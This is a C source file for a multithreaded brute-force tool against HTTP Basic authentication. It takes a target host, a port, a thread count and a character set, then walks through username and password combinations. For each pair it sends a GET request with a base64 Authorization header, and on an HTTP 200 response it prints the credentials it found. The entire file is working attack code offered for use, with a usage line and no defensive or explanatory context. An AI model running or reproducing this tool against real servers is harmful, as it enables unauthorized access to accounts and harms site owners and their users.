
/* free as in asprintf */
#define _GNU_SOURCE

#include <stdio.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netdb.h>
#include <semaphore.h>
#include "list.h"
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include "base64.h"

struct sockaddr_in target;
char charstart;
char charend;
char charset[256];
int charset_len;
char *request; 
int request_len;

sem_t job_ready;
sem_t job_waiting;

char *nextjob;

int do_job(char *job)
{
	printf("%d\n", syscall(SYS_gettid));
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	int ret = 0;
	if(fd == -1)
	{
		perror("socket");
		return -1;
	}
	struct sockaddr_in remote = target;
	if(connect(fd, (struct sockaddr*)&remote, sizeof(remote)) == -1)
	{
		perror("connect");
		ret = -1;
		goto cleanup;
	}

	send(fd, request, request_len, 0); 
	send(fd, job, strlen(job), 0);
	send(fd, "\r\n\r\n", 4, 0);

	char buffer[128];
	int len = recv(fd, buffer, sizeof(buffer), 0);
	if(len == 0)
	{
		fprintf(stderr, "server unexpectedly closed connection\n");
		ret = -1;
		goto cleanup;
	}
	if(len == -1)
	{
		perror("recv");
		ret = -1;
		goto cleanup;
	}
	char *toksave;
	strtok_r(buffer, " ", &toksave);
	int response = atoi(strtok_r(NULL, " ", &toksave));
	if(response == 200)
	{
		size_t out_len;
		printf("details: %s\n", base64_decode(job, strlen(job), &out_len));
		exit(0);
	}

cleanup:
	close(fd);
	return ret;
}

void *worker_thread(void *worker)
{
	while(1)
	{
		sem_wait(&job_ready);
		char *job = nextjob;
		sem_post(&job_waiting);

		int result = do_job(job);
		free(job);
		if(result == -1)
			break;
	}
	return NULL;
}

void queue_job(char *u, char *p)
{
	char combined[128];
	snprintf(combined, sizeof(combined), "%s:%s", u, p);
	sem_wait(&job_waiting);
	size_t out_len;
	nextjob = base64_encode(combined, strlen(combined), &out_len);
	sem_post(&job_ready);
}

char next(char *str, int len)
{
	int str_len = strlen(str);
	if(!str_len)
	{
		str[0] = charstart;
		str[1] = '\0';
		return 1;
	}
	int i;
	for(i = str_len-1;i >= 0;i--)
	{
		if(str[i] != charend)
		{
			str[i] = charset[str[i]];
			for(i++;i < str_len;i++)
			{
				str[i] = charstart;
			}
			return 1;
		}
	}
	if(str_len == len-2)
		return 0;
	for(i = 0;i < str_len;i++)
		str[i] = charstart;
	str[str_len] = charstart;
	str[str_len+1] = '\0';
	return 1;
}

int main(int argc, char *argv[])
{
	if(argc != 7)
	{
		fprintf(stderr, "Usage: %s <host> <port> <worker threads> <charset> <upper limit user (max 29) <upper limit pass (max 29)>\n", argv[0]);
		return 0;
	}

	char *host = argv[1];
	int port = atoi(argv[2]);
	int worker_threads = atoi(argv[3]);
	charstart = argv[4][0];
	charend = argv[4][strlen(argv[4])-1];
	int i;
	for(i = 0;i < strlen(argv[4]) - 1;i++)
	{
		charset[argv[4][i]] = argv[4][i+1];
	}
	charset[charend] = '\0';
	int max_size_u = atoi(argv[5]) + 2;
	if(max_size_u > 31)
		max_size_u = 31;
	int max_size_p = atoi(argv[6]) + 2;
	if(max_size_p > 31)
		max_size_p = 31;

	struct hostent *he;

	if((he = gethostbyname(host)) == NULL)
	{
		perror("gethostbyname");
		return 0;
	}

	struct in_addr *addr = (struct in_addr*)he->h_addr_list[0];

	memset(&target, 0, sizeof(target));
	target.sin_family = AF_INET;
	target.sin_addr = *addr;
	target.sin_port = htons(port);

	request_len = asprintf(&request, "GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic ", host);

	sem_init(&job_ready, 0, 0);
	sem_init(&job_waiting, 0, 1);

	for(i = 0;i < worker_threads;i++)
	{
		pthread_t thread;
		pthread_create(&thread, NULL, worker_thread, NULL);
		pthread_detach(thread);
	}

	char username[32];
	char password[32];

	username[0] = '\0';
	while(next(username, max_size_u))
	{
		password[0] = '\0';
		while(next(password, max_size_p))
		{
			queue_job(username, password);
			printf("%s:%s\n", username, password);
		}
	}
}

